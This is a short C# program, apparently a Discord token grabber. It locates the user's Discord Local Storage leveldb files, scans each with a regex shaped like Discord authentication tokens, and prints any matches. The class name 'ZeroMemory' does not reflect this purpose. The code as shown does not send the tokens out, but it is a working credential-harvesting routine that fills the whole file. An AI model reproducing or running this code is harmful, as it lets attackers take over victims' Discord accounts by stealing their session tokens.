using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

class ZeroMemory
{
    public static void Main()
    {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+ @"\discord\Local Storage\leveldb";
        //
        string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
        Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
        //Match match = regex.Match(contents);
        foreach (var file in dbfiles)
        {
            FileInfo info = new FileInfo(file);
            string contents = File.ReadAllText(info.FullName);
            Match match = regex.Match(contents);
            if (match.Success)
            {
                Console.WriteLine(match.Value);
            }

        }

    }


}
